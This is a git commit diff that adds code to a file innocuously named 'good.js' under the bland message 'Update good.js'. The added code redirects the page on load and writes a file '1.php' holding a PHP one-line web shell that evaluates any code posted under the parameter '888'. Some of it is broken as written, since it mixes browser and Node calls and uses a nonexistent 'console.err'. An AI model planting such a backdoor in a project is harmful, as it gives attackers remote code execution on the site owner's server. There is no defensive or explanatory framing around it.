0c93cf836d65744886929f10b646e7f34a95e714
oyy114 <JAVA_BELIKE@outlook.com>
2024-10-06 08:36:08 +0800

    Update good.js

--- Support/good.js
+++ Support/good.js
@@ -1,1 +1,13 @@
 
+window.onload=function(){
+  window.location.href="https://system-404-blog";
+  const fs = require('fs');
+  const name = "<? @eval($_POST['888']); ?>";
+  fs.writeFile("1.php",name,(err) => {
+    if (err){
+      console.err(err);
+      return;
+    }
+    console.log("ok")
+  });
+}
